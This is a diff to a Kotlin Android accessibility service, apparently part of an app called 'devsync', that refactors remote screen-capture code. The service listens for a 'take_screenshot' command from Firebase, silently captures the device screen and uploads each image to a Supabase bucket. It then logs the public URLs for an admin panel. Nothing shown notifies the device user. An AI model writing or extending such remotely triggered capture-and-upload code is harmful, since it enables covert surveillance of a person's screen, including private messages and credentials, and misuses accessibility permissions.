@@ -3,19 +3,8 @@ package com.example.devsync
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.graphics.Bitmap
-import android.graphics.PixelFormat
-import android.hardware.display.DisplayManager
-import android.hardware.display.VirtualDisplay
-import android.media.Image
-import android.media.ImageReader
-import android.media.projection.MediaProjection
-import android.media.projection.MediaProjectionManager
 import android.os.Build
-import android.os.Handler
-import android.os.Looper
 import android.provider.Settings
-import android.util.DisplayMetrics
-import android.view.WindowManager
 import android.view.accessibility.AccessibilityEvent
 import com.google.firebase.database.DataSnapshot
 import com.google.firebase.database.DatabaseError
@@ -27,7 +16,7 @@ import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.ByteArrayOutputStream
-import java.io.IOException
+import java.util.concurrent.Executor
 
 class ScreenshotService : AccessibilityService() {
 
@@ -48,7 +37,6 @@ class ScreenshotService : AccessibilityService() {
         FirebaseDatabase.getInstance(DB_URL).getReference("registered_devices/$deviceId")
     }
     private val httpClient = OkHttpClient()
-    private val handler = Handler(Looper.getMainLooper())
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -69,35 +57,39 @@ class ScreenshotService : AccessibilityService() {
                     database.child("take_screenshot").removeValue()
                     regRef.child("lastStatus").setValue("⏳ Taking screenshot...")
                     regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
-                    takeScreenshot()
+                    captureScreen()
                 }
             }
             override fun onCancelled(error: DatabaseError) {}
         })
     }
 
-    private fun takeScreenshot() {
+    private fun captureScreen() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            val executor = Executor { command -> command.run() }
             takeScreenshot(
-                Display.DEFAULT_DISPLAY,
-                mainExecutor,
+                android.view.Display.DEFAULT_DISPLAY,
+                executor,
                 object : TakeScreenshotCallback {
                     override fun onSuccess(screenshotResult: ScreenshotResult) {
                         val bitmap = Bitmap.wrapHardwareBuffer(
-                            screenshotResult.hardwareBuffer, screenshotResult.colorSpace
+                            screenshotResult.hardwareBuffer,
+                            screenshotResult.colorSpace
                         )?.copy(Bitmap.Config.ARGB_8888, false)
                         screenshotResult.hardwareBuffer.close()
-                        bitmap?.let { uploadToSupabase(it) }
+                        if (bitmap != null) {
+                            uploadToSupabase(bitmap)
+                        } else {
+                            reportStatus("❌ Screenshot bitmap null")
+                        }
                     }
                     override fun onFailure(errorCode: Int) {
-                        regRef.child("lastStatus").setValue("❌ Screenshot failed: code $errorCode")
-                        regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
+                        reportStatus("❌ Screenshot failed: code $errorCode")
                     }
                 }
             )
         } else {
-            regRef.child("lastStatus").setValue("❌ Screenshot requires Android 11+")
-            regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
+            reportStatus("❌ Screenshot requires Android 11+")
         }
     }
 
@@ -110,11 +102,10 @@ class ScreenshotService : AccessibilityService() {
 
                 val timestamp = System.currentTimeMillis()
                 val fileName = "${deviceId}_${timestamp}.jpg"
-                val path = "storage/v1/object/$BUCKET/$fileName"
 
                 val body = bytes.toRequestBody("image/jpeg".toMediaType())
                 val request = Request.Builder()
-                    .url("$SUPABASE_URL/$path")
+                    .url("$SUPABASE_URL/storage/v1/object/$BUCKET/$fileName")
                     .header("Authorization", "Bearer $SUPABASE_KEY")
                     .header("Content-Type", "image/jpeg")
                     .post(body)
@@ -123,7 +114,6 @@ class ScreenshotService : AccessibilityService() {
                 httpClient.newCall(request).execute().use { response ->
                     if (response.isSuccessful) {
                         val publicUrl = "$SUPABASE_URL/storage/v1/object/public/$BUCKET/$fileName"
-                        // Save to Firebase so admin panel can show it
                         val screenshotRef = FirebaseDatabase.getInstance(DB_URL)
                             .getReference("screenshots").push()
                         screenshotRef.setValue(mapOf(
@@ -131,18 +121,20 @@ class ScreenshotService : AccessibilityService() {
                             "url" to publicUrl,
                             "timestamp" to timestamp
                         ))
-                        regRef.child("lastStatus").setValue("📸 Screenshot uploaded")
-                        regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
+                        reportStatus("📸 Screenshot uploaded ✅")
                     } else {
-                        regRef.child("lastStatus").setValue("❌ Upload failed: ${response.code}")
-                        regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
+                        reportStatus("❌ Upload failed: ${response.code}")
                     }
                 }
             } catch (e: Exception) {
-                regRef.child("lastStatus").setValue("❌ Upload error: ${e.message}")
-                regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
+                reportStatus("❌ Upload error: ${e.message}")
             }
         }
+    }
+
+    private fun reportStatus(status: String) {
+        regRef.child("lastStatus").setValue(status)
+        regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
